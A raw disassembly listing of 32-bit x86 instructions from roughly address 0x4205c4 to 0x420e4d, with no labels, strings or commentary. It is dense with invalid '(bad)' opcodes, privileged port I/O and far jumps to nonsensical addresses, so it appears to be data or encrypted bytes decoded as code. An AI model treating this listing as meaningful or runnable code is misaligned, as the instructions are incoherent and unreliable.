  4205c4:	icebp  
  4205c5:	in     al,0xe6
  4205c7:	mov    bh,0xeb
  4205c9:	mov    dh,0xcc
  4205cb:	mov    ebx,0xe9ade7f8
  4205d0:	mov    ebp,0xedfaddc8
  4205d5:	mov    esp,0xc0f2dfbf
  4205da:	lock test edx,0x5facfde
  4205e1:	(bad)  
  4205e3:	loope  0x420593
  4205e5:	lock leave 
  4205e7:	repnz cmc 
  4205e9:	in     al,dx
  4205ea:	(bad)  
  4205eb:	jmp    0xd507dddf
  4205f0:	jmp    0xdedc:0x3d0b8bb
  4205f7:	sar    esi,0xec
  4205fa:	(bad)  
  4205fb:	fadd   st,st(4)
  4205fd:	cli    
  4205fe:	jmp    0xb1de802
  420603:	in     eax,0xc4
  420605:	xlat   BYTE PTR ds:[ebx]
  420606:	imul   DWORD PTR [eax+eax*8-0xf161433]
  42060d:	mov    al,0xc7
  42060f:	cli    
  420610:	hlt    
  420611:	hlt    
  420612:	mov    cl,0xe9
  420614:	fcomi  st,st(7)
  420616:	fstp   TBYTE PTR [edi-0x3ffeffff]
  42061c:	out    0xda,al
  42061e:	pop    es
  42061f:	cli    
  420620:	add    al,0xe
  420622:	repz iret 
  420624:	loope  0x42060f
  420626:	ror    bl,cl
  420628:	lock jmp 0xf2b5:0xb4f3e9b0
  420630:	call   0xc040c20c
  420635:	mov    edx,0xd5d6b4dc
  42063a:	add    al,0xd2
  42063c:	lock ffree st(7)
  42063f:	mov    ah,0xc9
  420642:	clc    
  420643:	adc    ebx,edx
  420645:	loop   0x4205f9
  420647:	(bad)
  42064b:	jmp    0xbc09fd3d
  420650:	(bad)  
  420652:	mov    ch,0xe3
  420654:	fucomi st,st(5)
  420656:	loope  0x420644
  420658:	fild   WORD PTR [esi]
  42065a:	loope  0x420651
  42065c:	(bad)  
  42065d:	out    0xf,al
  42065f:	std    
  420660:	add    dl,ah
  420662:	fild   WORD PTR [eax*8-0x9340c57]
  420669:	ret    0xa8b7
  42066c:	jmp    0x42062e
  42066e:	imul   ebp
  420670:	(bad)  
  420671:	out    dx,al
  420672:	fdivr  st(3),st
  420674:	aad    0xdf
  420676:	(bad)  
  420677:	aad    0xff
  420679:	mov    esp,0xef0000da
  42067e:	(bad)  
  42067f:	stc    
  420680:	in     eax,0xdd
  420682:	retf   0xdfea
  420685:	lods   eax,DWORD PTR ds:[esi]
  420686:	loopne 0x42067d
  420688:	stos   DWORD PTR es:[edi],eax
  420689:	(bad)  
  42068a:	loope  0x42067d
  42068c:	in     al,dx
  42068d:	mov    ebx,0xedbde5da
  420692:	(bad)  
  420693:	(bad)  
  420694:	jmp    0xc602c088
  420699:	lock add al,0x7
  42069c:	shl    dl,1
  42069e:	leave  
  42069f:	out    dx,al
  4206a0:	ret    
  4206a1:	or     ah,bh
  4206a3:	jmp    0xeee9:0xb6e8e3c8
  4206aa:	call   0xe722de75
  4206af:	leave  
  4206b0:	jmp    0xc7d6:0x3d6fcd2
  4206b7:	mov    ebp,0x7d5f3dd
  4206bc:	call   0xce38cba0
  4206c1:	inc    BYTE PTR ds:0xc9e5dced
  4206c7:	jmp    0xf2bb:0xe7d1b1e0
  4206ce:	mov    bh,0xcc
  4206d0:	aam    0xed
  4206d2:	sar    eax,cl
  4206d4:	add    ch,cl
  4206d6:	jecxz  0x4206d3
  4206d8:	add    ah,bl
  4206da:	mov    ch,0xf4
  4206dd:	retf   
  4206de:	(bad)  
  4206e0:	add    BYTE PTR [ebx],dl
  4206e2:	push   es
  4206e3:	adc    eax,ebx
  4206e5:	loop   0x4206b0
  4206e7:	mov    esp,0xd2cdc4ab
  4206ec:	repnz mov dh,0xe9
  4206ef:	icebp  
  4206f0:	mov    eax,0x1f102f3
  4206f5:	xlat   BYTE PTR ds:[ebx]
  4206f6:	rcr    ch,cl
  4206f8:	test   al,0x7
  4206fb:	ret    
  4206fc:	loope  0x4206c4
  4206fe:	aam    0xf
  420700:	cli    
  420701:	fcmovu st,st(3)
  420703:	retf   0xc1b1
  420706:	out    dx,eax
  420707:	retf   
  420708:	ret    0xe0c8
  42070b:	xlat   BYTE PTR ds:[ebx]
  42070c:	(bad)  
  42070d:	mov    ebx,0xb4e9edde
  420712:	clc    
  420713:	add    esi,edx
  420715:	test   dh,0xd1
  420718:	rol    ebx,1
  42071a:	mov    esp,0xe3f0e907
  42071f:	loope  0x42071d
  420721:	in     al,0xeb
  420723:	loop   0x42070d
  420725:	mov    esi,0xc5e0ded2
  42072a:	jmp    0xe5b4:0xfbf0b7f4
  420731:	jmp    0x420708
  420733:	cld    
  420734:	clc    
  420735:	xlat   BYTE PTR ds:[ebx]
  420736:	sar    DWORD PTR [esi-0xb26fe13],1
  42073c:	stc    
  42073d:	(bad)  
  42073e:	aam    0x5
  420740:	(bad)  [esi]
  420742:	adc    esp,edi
  420744:	mov    eax,0xb5c4e6e2
  420749:	mov    al,0xc0
  42074b:	lods   al,BYTE PTR ds:[esi]
  42074c:	loopne 0x420707
  42074e:	in     al,dx
  42074f:	repz aad 0xf6
  420752:	mov    ah,0xc8
  420754:	add    al,cl
  420756:	shl    edx,cl
  420758:	inc    DWORD PTR [edi]
  42075a:	ret    0xfaf2
  42075d:	rcr    dl,0xf4
  420760:	jmp    0xc7111640
  420765:	(bad)  
  420766:	div    BYTE PTR [esi-0x3d082c51]
  42076c:	sti    
  42076d:	stc    
  42076e:	in     eax,0xcd
  420770:	retf   
  420771:	repnz xlat BYTE PTR ds:[ebx]
  420773:	mov    ecx,0xd7fcdebe
  420778:	int3   
  420779:	ffree  st(0)
  42077b:	rcr    bl,0xc8
  42077e:	cli    
  42077f:	les    eax,FWORD PTR [edx]
  420781:	leave  
  420782:	add    eax,ecx
  420784:	test   al,0xcb
  420786:	fmul   st(6),st
  420788:	(bad)  
  420789:	jmp    0xf0cf:0xaec5b0e7
  420790:	rol    ah,cl
  420792:	add    esi,esi
  420794:	neg    dh
  420796:	mov    eax,0xfef7d1c6
  42079b:	stc    
  42079c:	sti    
  42079d:	retf   
  42079e:	or     ah,ah
  4207a0:	aad    0xea
  4207a2:	out    dx,eax
  4207a3:	add    esp,eax
  4207a5:	lock mov esp,0xf0edc9c0
  4207ab:	leave  
  4207ac:	int3   
  4207ad:	in     al,0xbf
  4207af:	(bad)
  4207b2:	into   
  4207b3:	cmc    
  4207b4:	shl    edi,cl
  4207b6:	in     eax,dx
  4207b7:	loop   0x4207b8
  4207b9:	(bad)
  4207bc:	or     ebx,esp
  4207be:	fmul   st(3),st
  4207c0:	(bad)  
  4207c1:	jmp    0xe10eeead
  4207c6:	mov    bh,0xbc
  4207c8:	(bad)  
  4207c9:	test   bl,0xb3
  4207cc:	in     al,0xec
  4207ce:	(bad)  
  4207cf:	mov    ecx,0xd2eefcf5
  4207d4:	jmp    0xc430e9d9
  4207d9:	(bad)  
  4207db:	add    DWORD PTR [eax],eax
  4207dd:	ret    0xe9eb
  4207e0:	loop   0x4207c7
  4207e2:	stc    
  4207e3:	add    esp,esi
  4207e5:	xlat   BYTE PTR ds:[ebx]
  4207e6:	imul   esi
  4207e8:	jmp    0x4207a0
  4207ea:	in     al,dx
  4207eb:	mov    ch,0xe5
  4207ed:	jmp    0xfde2:0xffd4c8b5
  4207f4:	cli    
  4207f5:	add    dl,dl
  4207f7:	fild   WORD PTR [eax]
  4207f9:	ret    
  4207fa:	add    ah,bh
  4207fc:	cld    
  4207fd:	cmc    
  4207fe:	cmc    
  4207ff:	cli    
  420800:	add    edi,ecx
  420802:	pop    es
  420803:	in     al,dx
  420804:	loope  0x4207c2
  420806:	into   
  420807:	ret    0xd7c1
  42080a:	in     eax,dx
  42080b:	xlat   BYTE PTR ds:[ebx]
  42080c:	(bad)  
  42080e:	fsubr  st,st(7)
  420810:	aad    0xba
  420812:	jmp    0x4de:0xe0fcf0bc
  420819:	fadd   st,st(3)
  42081b:	fcmovb st,st(2)
  42081d:	out    0xd5,eax
  42081f:	in     al,0xf8
  420821:	dec    DWORD PTR ds:0xc5b8dec0
  420827:	test   al,0xc6
  420829:	icebp  
  42082a:	ret    0xc9bb
  42082d:	(bad)  
  42082e:	icebp  
  42082f:	cli    
  420830:	in     eax,dx
  420831:	leave  
  420832:	not    eax
  420834:	mov    bh,0xda
  420836:	sti    
  420837:	fmul   st,st(5)
  420839:	add    al,0xfd
  42083b:	ror    BYTE PTR [ebx],1
  42083d:	mul    esi
  42083f:	add    bh,bl
  420841:	fucomip st,st(0)
  420843:	stc    
  420844:	fnstsw WORD PTR [eax-0x234f1b3e]
  42084a:	ror    esi,cl
  42084c:	repz (bad) 
  42084e:	xlat   BYTE PTR ds:[ebx]
  42084f:	mov    bh,0xc8
  420851:	std    
  420852:	fsubp  st(6),st
  420854:	mov    bh,0xee
  420856:	add    ecx,esp
  420858:	cmc    
  420859:	loope  0x42082b
  42085b:	out    0xfc,al
  42085d:	add    eax,0xae50df4
  420862:	cld    
  420863:	or     ecx,edx
  420865:	mov    dl,0xf2
  420867:	jmp    0x42082f
  420869:	mov    cl,0xf0
  42086c:	mov    ah,0xef
  42086e:	mov    ecx,0xf2bbdeb9
  420873:	repnz out dx,eax
  420875:	mov    eax,0xf6dddb02
  42087a:	rol    dh,cl
  42087c:	add    DWORD PTR [edx],ecx
  42087e:	test   ch,0xed
  420881:	out    dx,al
  420882:	lds    eax,FWORD PTR [esp+ecx*8]
  420885:	mov    ebp,0xcff7b2bf
  42088a:	mov    al,0xd5
  42088c:	retf   0xe9b6
  42088f:	fdivrp st(6),st
  420891:	cli    
  420892:	mov    edx,0xbcbfe0ff
  420897:	lock cli 
  420899:	add    eax,eax
  42089b:	(bad)  
  42089c:	loope  0x42087c
  42089e:	(bad)  
  42089f:	fcmovnu st,st(3)
  4208a1:	loopne 0x42088d
  4208a3:	(bad)  
  4208a5:	mov    al,0xce
  4208a7:	loop   0x420899
  4208a9:	retf   0xe6d1
  4208ac:	lds    esi,FWORD PTR [ecx-0x134a0e45]
  4208b2:	fxch   st(7)
  4208b4:	mov    edi,0xe3f5fbe8
  4208b9:	in     al,dx
  4208ba:	add    cl,BYTE PTR [ecx]
  4208bc:	or     esi,esi
  4208be:	out    dx,eax
  4208bf:	sti    
  4208c0:	in     eax,0xe1
  4208c2:	or     al,0xe3
  4208c4:	shl    cl,0xc6
  4208c7:	imul   dh
  4208c9:	(bad)
  4208cc:	rol    ah,1
  4208ce:	out    dx,al
  4208cf:	retf   0xcaca
  4208d2:	in     eax,dx
  4208d3:	add    esi,ecx
  4208d5:	out    0xe1,eax
  4208d7:	icebp  
  4208d8:	sar    bh,0xc3
  4208db:	loopne 0x4208b1
  4208dd:	or     bh,cl
  4208df:	into   
  4208e0:	sti    
  4208e1:	or     ebx,ebp
  4208e3:	jmp    0xe1ac:0xc6a5b3e7
  4208ea:	rcl    ah,0xea
  4208ed:	mov    ebx,0xbdbdeaad
  4208f2:	enter  0xe1dc,0xf8
  4208f6:	inc    ecx
  4208f8:	std    
  4208f9:	fdiv   st(1),st
  4208fb:	xlat   BYTE PTR ds:[ebx]
  4208fc:	in     al,0xc0
  4208fe:	shl    dh,0xd8
  420901:	cli    
  420902:	in     al,0x12
  420904:	enter  0xc7e6,0xac
  420908:	jecxz  0x4208d1
  42090a:	cli    
  42090b:	int    0xcd
  42090d:	mov    dl,0xb1
  42090f:	std    
  420910:	neg    dl
  420912:	mov    ah,0xc8
  420914:	xlat   BYTE PTR ds:[ebx]
  420915:	icebp  
  420916:	(bad)  
  420917:	sti    
  420918:	repz (bad) 
  42091a:	aam    0xea
  42091c:	in     eax,0xc0
  42091e:	fprem1 
  420920:	call   0xb22ef6f3
  420925:	in     al,0xb1
  420927:	in     eax,0xd0
  420929:	int    0xe4
  42092b:	(bad)
  42092e:	fcmovnb st,st(5)
  420930:	in     al,dx
  420931:	out    dx,al
  420932:	sar    BYTE PTR [edi-0x3909321f],1
  420938:	xlat   BYTE PTR ds:[ebx]
  420939:	cld    
  42093a:	or     bh,BYTE PTR [eax-0x2bfdfe35]
  420940:	cmc    
  420941:	add    ecx,esi
  420943:	or     eax,0xa4e0eae3
  420948:	repnz out 0xe1,al
  42094b:	enter  0xd7f2,0xf0
  42094f:	stc    
  420950:	mov    ecx,0xdef5f2b8
  420955:	in     eax,dx
  420956:	in     al,dx
  420957:	clc    
  420958:	aam    0xc4
  42095a:	in     al,0xd8
  42095c:	cld    
  42095d:	(bad)  
  42095e:	enter  0xe6c7,0xed
  420962:	call   0xc033d86e
  420967:	aad    0xd3
  420969:	scas   al,BYTE PTR es:[edi]
  42096a:	cmc    
  42096b:	loop   0x420956
  42096d:	mov    eax,0xf0f6e8ce
  420972:	retf   
  420973:	mov    eax,0xfbbed6
  420978:	in     al,dx
  420979:	out    0xeb,eax
  42097b:	fld    DWORD PTR [edi]
  42097d:	leave  
  42097e:	loop   0x420981
  420980:	enter  0xb,0xf8
  420984:	call   0xb002db68
  420989:	shl    ecx,1
  42098b:	sti    
  42098c:	loopne 0x420962
  42098e:	shr    dh,cl
  420990:	mov    ecx,0xdbbcd8f2
  420995:	mov    dh,0xce
  420997:	add    esi,edi
  420999:	hlt    
  42099a:	ret    
  42099b:	(bad)  
  42099c:	neg    dh
  42099e:	out    dx,eax
  42099f:	or     esp,esi
  4209a1:	in     eax,0xcc
  4209a3:	or     BYTE PTR [ebx+eiz*8-0xc331719],bh
  4209aa:	in     al,dx
  4209ab:	icebp  
  4209ac:	loope  0x420984
  4209ae:	ror    dh,1
  4209b0:	repz retf 
  4209b2:	out    dx,eax
  4209b3:	ret    
  4209b4:	mov    ebx,0xe40306c0
  4209b9:	(bad)  
  4209ba:	div    cl
  4209bc:	add    cl,BYTE PTR [ebx]
  4209be:	fucompp 
  4209c0:	dec    DWORD PTR [eax]
  4209c2:	or     ch,cl
  4209c4:	fstp   st(5)
  4209c6:	repnz int3 
  4209c8:	leave  
  4209c9:	call   0xd22fd88e
  4209ce:	les    esi,FWORD PTR [ebp-0xe334342]
  4209d4:	xlat   BYTE PTR ds:[ebx]
  4209d5:	add    esp,edx
  4209d7:	ret    0xf7c7
  4209da:	ror    DWORD PTR [edx],1
  4209dc:	in     eax,0xef
  4209de:	push   cs
  4209df:	sti    
  4209e0:	jmp    0xc9a8:0xb30c0afe
  4209e7:	mov    cl,0xad
  4209e9:	scas   al,BYTE PTR es:[edi]
  4209ea:	in     al,0xed
  4209ec:	rcr    ecx,0xbf
  4209ef:	fdiv   st,st(2)
  4209f1:	int    0xb1
  4209f3:	mov    esi,0xeef5e8d1
  4209f8:	add    al,0xdc
  4209fa:	in     al,0x4
  4209fc:	retf   0xe6e1
  4209ff:	(bad)  
  420a00:	(bad)  
  420a02:	iret   
  420a03:	or     ch,BYTE PTR [ecx-0x33113409]
  420a09:	mov    bh,0xf2
  420a0b:	mov    edx,0xfed3b2f2
  420a10:	in     al,0xfe
  420a12:	sar    BYTE PTR [ebp-0x1c260545],1
  420a18:	test   esp,0xd4ebc4d5
  420a1e:	add    ch,ch
  420a20:	or     cl,BYTE PTR [edx]
  420a22:	cli    
  420a23:	or     ecx,esp
  420a25:	mov    edi,0xe9c1c7e3
  420a2a:	int3   
  420a2b:	rol    ah,0xca
  420a2e:	mov    dh,0xf5
  420a30:	jmp    0xe1ee:0xf5d403ef
  420a37:	add    DWORD PTR [edi-0x243ffb2c],edi
  420a3d:	(bad)  
  420a3e:	leave  
  420a3f:	fadd   st,st(5)
  420a41:	stc    
  420a42:	fucomip st,st(0)
  420a44:	mov    edi,0xdcc7f3b8
  420a49:	loop   0x420a2f
  420a4b:	out    dx,al
  420a4c:	out    dx,eax
  420a4d:	mov    cl,0xca
  420a4f:	std    
  420a50:	stc    
  420a51:	std    
  420a52:	fdivr  QWORD PTR [eax-0x1a0b2207]
  420a58:	fstp   TBYTE PTR [edx-0x3e160207]
  420a5e:	out    0xd,al
  420a60:	or     al,0xed
  420a62:	or     ecx,DWORD PTR [edx]
  420a64:	call   0xc81eb717
  420a69:	hlt    
  420a6a:	out    0xec,al
  420a6c:	in     al,0xb8
  420a6e:	(bad)  [ebp-0x25120428]
  420a74:	std    
  420a75:	in     eax,dx
  420a76:	aam    0xd9
  420a78:	mov    ebx,0xca06d6da
  420a7d:	retf   
  420a7e:	loopne 0x420a7d
  420a80:	add    al,0xf9
  420a82:	in     eax,dx
  420a83:	(bad)  
  420a84:	in     al,dx
  420a85:	in     eax,0xe7
  420a87:	ret    
  420a88:	mov    bh,0xe9
  420a8a:	ret    0xe0c1
  420a8d:	shl    DWORD PTR [ebp-0x1d3b4634],cl
  420a93:	cmc    
  420a94:	cli    
  420a95:	enter  0xedf5,0xf0
  420a99:	add    edx,esi
  420a9b:	icebp  
  420a9c:	jecxz  0x420a81
  420a9e:	call   0x74013a0
  420aa3:	rcr    ch,0xef
  420aa6:	retf   0xd5bc
  420aa9:	out    0xfa,al
  420aab:	jmp    0xf8f3bd65
  420ab0:	push   esi
  420ab2:	test   cl,0xfd
  420ab5:	in     al,dx
  420ab6:	push   es
  420ab7:	stc    
  420ab8:	add    dh,ah
  420aba:	out    0xd8,eax
  420abc:	stc    
  420abd:	sti    
  420abe:	test   BYTE PTR [edx],0xec
  420ac1:	dec    BYTE PTR [esi]
  420ac3:	into   
  420ac4:	out    dx,al
  420ac5:	fcom   st(3)
  420ac7:	in     al,dx
  420ac8:	mov    dl,0xb7
  420aca:	(bad)  
  420acb:	out    dx,eax
  420acc:	rcl    esi,0xb7
  420acf:	mov    esi,0xb0dceef9
  420ad4:	repz imul ch
  420ad7:	into   
  420ad8:	stc    
  420ad9:	lds    eax,FWORD PTR [edi]
  420adb:	(bad)  
  420adc:	icebp  
  420add:	enter  0xe5c9,0x0
  420ae1:	push   cs
  420ae2:	jmp    0xe527eebf
  420ae7:	mov    cl,0xec
  420ae9:	in     al,0xee
  420aeb:	int    0xe0
  420aed:	(bad)  
  420aee:	rcr    eax,cl
  420af0:	int    0xf9
  420af2:	std    
  420af3:	rcr    al,1
  420af5:	mov    edi,0xfef9f6d1
  420afa:	sar    ch,0xeb
  420afd:	inc    DWORD PTR [ecx]
  420aff:	add    bl,al
  420b01:	ficom  WORD PTR [edx]
  420b03:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b05:	fdivr  QWORD PTR [edi-0x56093142]
  420b0b:	out    0xcd,al
  420b0d:	int    0xb0
  420b0f:	mov    ah,0xd7
  420b11:	cld    
  420b12:	jmp    0x420b13
  420b14:	not    ch
  420b16:	lock fcmovnb st,st(3)
  420b19:	rcr    ch,cl
  420b1b:	retf   
  420b1c:	push   es
  420b1d:	fmul   st(2),st
  420b1f:	std    
  420b20:	or     ebp,esp
  420b22:	(bad)  
  420b23:	fdivr  QWORD PTR [eax-0x13183557]
  420b29:	scas   al,BYTE PTR es:[edi]
  420b2a:	mov    dl,0xf4
  420b2c:	retf   
  420b2d:	(bad)  
  420b2e:	into   
  420b2f:	(bad)  
  420b30:	jmp    0xf414040b
  420b35:	add    bl,bh
  420b37:	(bad)  
  420b38:	mov    ebx,0x7f100f0
  420b3d:	out    0xe,al
  420b3f:	(bad)  
  420b40:	push   cs
  420b41:	iret   
  420b42:	pandn  mm0,mm2
  420b45:	lods   eax,DWORD PTR ds:[esi]
  420b46:	(bad)  
  420b47:	lds    esi,FWORD PTR [ebx-0x4d2e2e4d]
  420b4d:	fbstp  TBYTE PTR [ebp-0x282f3107]
  420b53:	(bad)  
  420b55:	test   ah,0xd2
  420b58:	inc    ebx
  420b5a:	stc    
  420b5b:	in     al,0x2
  420b5d:	loopne 0x420b5e
  420b5f:	enter  0xde3,0xe2
  420b63:	in     al,dx
  420b64:	rcr    ah,cl
  420b66:	shl    DWORD PTR [ebx+eax*8-0x904254c],0xd2
  420b6e:	icebp  
  420b6f:	cmc    
  420b70:	fdivr  DWORD PTR [edi-0x2e0c0e12]
  420b76:	(bad)  
  420b78:	fnclex 
  420b7a:	repnz (bad) 
  420b7c:	aad    0x7
  420b7e:	(bad)  
  420b7f:	inc    ebp
  420b81:	or     ebx,edx
  420b83:	jmp    0xcf09cb47
  420b88:	rcl    ch,cl
  420b8a:	shl    BYTE PTR [eax-0x52d342f],1
  420b90:	sar    DWORD PTR [edi-0x3e074201],cl
  420b96:	xlat   BYTE PTR ds:[ebx]
  420b97:	in     eax,0xd1
  420b99:	out    0xe5,eax
  420b9b:	shl    cl,1
  420b9d:	fsub   st,st(6)
  420b9f:	fsubrp st(4),st
  420ba1:	in     eax,dx
  420ba2:	or     bh,bh
  420ba4:	repz scas al,BYTE PTR es:[edi]
  420ba6:	enter  0xd5ce,0xe7
  420baa:	mov    dh,0xc4
  420bac:	retf   0xb6d4
  420baf:	rcl    esi,cl
  420bb1:	clc    
  420bb2:	mov    ch,0xf6
  420bb4:	mov    edi,0xd1daf7f2
  420bb9:	sar    BYTE PTR [ecx-0x4011b21],1
  420bbf:	cld    
  420bc0:	int    0xfd
  420bc2:	push   cs
  420bc3:	add    ebx,esp
  420bc5:	int    0xb2
  420bc7:	in     al,0xac
  420bc9:	shr    bl,cl
  420bcb:	mov    edi,0xbaeed7ee
  420bd1:	(bad)  
  420bd3:	int    0xbe
  420bd5:	ret    0x1f9
  420bd8:	shl    ebp,1
  420bda:	(bad)  
  420bdb:	sar    DWORD PTR [edi-0x23fb3030],1
  420be1:	std    
  420be2:	add    eax,0xd7c7c2ca
  420be7:	in     eax,dx
  420be8:	enter  0xefd4,0xc9
  420bec:	shl    DWORD PTR [edi-0x5220201],1
  420bf2:	in     al,dx
  420bf3:	mov    eax,0xc7b8fe00
  420bf8:	loopne 0x420bbc
  420bfa:	(bad)  
  420bfc:	mul    ah
  420bfe:	shl    esi,0xdc
  420c01:	jmp    0x420bd2
  420c03:	add    edi,DWORD PTR [ebp-0x4d212812]
  420c09:	ret    
  420c0a:	out    dx,eax
  420c0b:	mov    ah,0xe5
  420c0d:	(bad)
  420c10:	mov    eax,0x1d1f8bc
  420c15:	mov    edi,0xebcce0c3
  420c1a:	add    al,0xfa
  420c1c:	clc    
  420c1d:	fld    DWORD PTR [edx]
  420c1f:	mov    esp,0xdfbdfd4
  420c24:	jecxz  0x420c12
  420c26:	repnz mov edi,0xf8f1c6f2
  420c2d:	mov    cl,0xb9
  420c2f:	mov    ch,0xd6
  420c31:	xlat   BYTE PTR ds:[ebx]
  420c32:	std    
  420c33:	jmp    0xb9410600
  420c38:	sar    DWORD PTR [esi-0x181bf506],1
  420c3e:	cmc    
  420c3f:	(bad)  
  420c40:	std    
  420c41:	add    ebp,ecx
  420c43:	leave  
  420c44:	loopne 0x420c24
  420c46:	rol    eax,cl
  420c48:	call   0xd12ce41c
  420c4d:	dec    esp
  420c4f:	mov    ecx,0xed03f9c8
  420c54:	loopne 0x420c49
  420c56:	cld    
  420c57:	add    BYTE PTR [ebp+eiz*8+0x7d8f8d2],bh
  420c5e:	fdiv   st(6),st
  420c60:	retf   
  420c61:	(bad)  
  420c62:	inc    DWORD PTR [edx]
  420c64:	ror    dh,0xe7
  420c67:	iret   
  420c68:	retf   0xb1ee
  420c6b:	mov    ah,0xd6
  420c6d:	jmp    0xce40d25f
  420c72:	int3   
  420c73:	mov    esi,0xdafdc0f7
  420c78:	hlt    
  420c79:	repnz fdivr st,st(2)
  420c7c:	out    0xe4,al
  420c7e:	clc    
  420c7f:	cld    
  420c80:	into   
  420c81:	std    
  420c82:	(bad)
  420c85:	icebp  
  420c86:	mov    al,0xc1
  420c88:	shl    dh,0xd7
  420c8b:	(bad)
  420c8f:	fadd   st,st(5)
  420c91:	retf   0x3fb
  420c94:	loopne 0x420c64
  420c96:	cld    
  420c97:	ret    
  420c98:	(bad)  
  420c9a:	add    ebx,edi
  420c9c:	call   0xcf210b9a
  420ca1:	in     al,dx
  420ca2:	add    ecx,esi
  420ca4:	jmp    0x420c74
  420ca6:	fild   QWORD PTR [esp+esi*8-0x9314b30]
  420cad:	in     al,0xc6
  420caf:	int    0xb9
  420cb1:	shr    edi,cl
  420cb3:	rol    edx,1
  420cb5:	jecxz  0x420c8e
  420cb7:	mov    edi,0xf7e00706
  420cbc:	(bad)  
  420cbd:	(bad)  
  420cbe:	fsubr  st(4),st
  420cc0:	or     edx,edi
  420cc2:	out    dx,eax
  420cc3:	in     eax,dx
  420cc4:	jecxz  0x420cae
  420cc6:	lods   al,BYTE PTR ds:[esi]
  420cc7:	in     al,0xd3
  420cc9:	ror    dl,0xe5
  420ccc:	icebp  
  420ccd:	mov    ch,0xd8
  420ccf:	vpaddusw xmm0,xmm1,xmm3
  420cd3:	into   
  420cd4:	mov    ebp,0xf4bcb5d3
  420cd9:	loope  0x420ce5
  420cdb:	(bad)  
  420cdc:	loop   0x420ce6
  420cde:	loope  0x420ccb
  420ce0:	or     al,0x4
  420ce2:	sti    
  420ce3:	cld    
  420ce4:	(bad)  
  420ce6:	test   eax,0xb2e2cce4
  420ceb:	mov    ch,0xc8
  420ced:	mov    bh,0xf9
  420cef:	cli    
  420cf0:	call   0xfa45f7eb
  420cf5:	mov    esp,0xf8ccf7e6
  420cfa:	test   edx,0xe7c9fc08
  420d00:	(bad)  
  420d03:	add    ebp,DWORD PTR [ebp-0x4949134e]
  420d09:	jecxz  0x420ce1
  420d0b:	shl    bh,cl
  420d0d:	in     al,dx
  420d0e:	(bad)  
  420d0f:	mov    ch,0xd2
  420d11:	mov    ch,0xee
  420d13:	fdivr  QWORD PTR [ebx+0x3f9e201]
  420d19:	fstp   st(1)
  420d1b:	lock aam 0xf7
  420d1e:	add    al,bh
  420d20:	out    dx,al
  420d21:	or     ebx,ecx
  420d23:	enter  0xf2ce,0xbc
  420d27:	mov    cl,0xcd
  420d29:	int3   
  420d2a:	aam    0xfa
  420d2c:	cli    
  420d2d:	leave  
  420d2e:	aam    0xd8
  420d30:	int3   
  420d31:	sar    DWORD PTR [eax-0x3d302c11],1
  420d37:	mov    esp,0xd602dcd1
  420d3c:	hlt    
  420d3d:	stc    
  420d3e:	clc    
  420d3f:	or     ecx,DWORD PTR [esi]
  420d41:	loope  0x420d24
  420d43:	push   cs
  420d44:	ffree  st(3)
  420d46:	out    dx,al
  420d47:	out    0xc1,eax
  420d49:	(bad)  
  420d4a:	out    0xb3,eax
  420d4c:	clc    
  420d4d:	out    dx,eax
  420d4e:	mov    edi,0xbafcd7da
  420d53:	sti    
  420d54:	call   0xbd49f42f
  420d59:	(bad)  
  420d5b:	in     eax,0xf8
  420d5d:	(bad)  
  420d5e:	jmp    0x420d4e
  420d60:	pop    es
  420d61:	enter  0xdec4,0xf2
  420d65:	mov    edi,0xc1aeafe6
  420d6a:	mov    cl,0xc5
  420d6c:	(bad)  
  420d6e:	fcmovbe st,st(6)
  420d70:	icebp  
  420d71:	imul   eax
  420d73:	mov    edx,0xc0f5c0c2
  420d78:	push   es
  420d79:	(bad)  
  420d7a:	ffree  st(6)
  420d7c:	(bad)  
  420d7e:	call   0xe4490851
  420d83:	fsubr  QWORD PTR [ebp-0x490e502d]
  420d89:	lock cli 
  420d8b:	out    0xe0,al
  420d8d:	retf   
  420d8e:	(bad)  
  420d8f:	mov    bh,0xbf
  420d91:	in     al,0xf1
  420d93:	mov    edi,0xc0fadcd5
  420d98:	push   es
  420d99:	sar    edi,cl
  420d9b:	in     eax,0xe4
  420d9d:	out    0x7,eax
  420d9f:	(bad)  
  420da0:	aad    0xd4
  420da2:	cli    
  420da3:	jmp    0xfbef:0xc9e7e2b2
  420daa:	mov    cl,0xeb
  420dac:	into   
  420dad:	fcmovnbe st,st(2)
  420daf:	hlt    
  420db0:	mov    edx,0xf5f3f7f8
  420db5:	in     al,dx
  420db6:	(bad)  
  420db8:	loopne 0x420db0
  420dba:	test   ebx,0xf4fbbe08
  420dc0:	in     al,dx
  420dc1:	int    0xcd
  420dc3:	push   ebx
  420dc5:	test   eax,0xc4ebeead
  420dca:	lods   al,BYTE PTR ds:[esi]
  420dcb:	mov    dh,0xec
  420dcd:	mov    cl,0xf8
  420dcf:	xlat   BYTE PTR ds:[ebx]
  420dd0:	mov    edi,0xdebde2df
  420dd5:	xlat   BYTE PTR ds:[ebx]
  420dd6:	aad    0x1
  420dd8:	not    al
  420dda:	shl    bh,cl
  420ddc:	sti    
  420ddd:	test   DWORD PTR ds:0xecee3dc,0xf6d1ebdf
  420de7:	div    edi
  420de9:	stos   BYTE PTR es:[edi],al
  420dea:	(bad)  
  420deb:	out    dx,eax
  420dec:	out    0xcc,eax
  420dee:	aad    0xed
  420df0:	in     eax,dx
  420df1:	sar    edx,cl
  420df3:	(bad)  
  420df5:	(bad)  
  420df7:	in     al,dx
  420df8:	fcmovnb st,st(3)
  420dfa:	or     edx,ecx
  420dfc:	xlat   BYTE PTR ds:[ebx]
  420dfd:	enter  0xda06,0xda
  420e01:	(bad)
  420e05:	mov    esp,0xaad4eba5
  420e0a:	sti    
  420e0b:	shl    DWORD PTR [ebp+ebp*8-0x4d00052a],0xea
  420e13:	fild   WORD PTR [ecx]
  420e15:	int    0xde
  420e17:	fxch   st(5)
  420e19:	out    0xd3,eax
  420e1b:	jecxz  0x420de0
  420e1d:	or     dh,ah
  420e1f:	inc    ebx
  420e21:	in     al,0xc1
  420e23:	or     bh,BYTE PTR [ebp-0xb1a3d52]
  420e29:	fcmovne st,st(0)
  420e2b:	jmp    0x420dff
  420e2d:	in     eax,dx
  420e2e:	mov    cl,0xfa
  420e30:	in     al,0xe8
  420e32:	mov    cl,0xf6
  420e34:	int    0xd8
  420e36:	fcmovbe st,st(1)
  420e38:	aam    0xfc
  420e3a:	rol    BYTE PTR [ecx],1
  420e3c:	mov    edi,0xacbeeef
  420e41:	aam    0xb
  420e43:	enter  0xc3e4,0xd0
  420e47:	rcr    ebp,0xf0
  420e4a:	retf   
  420e4b:	rcl    ebx,1
  420e4d:	(bad)  
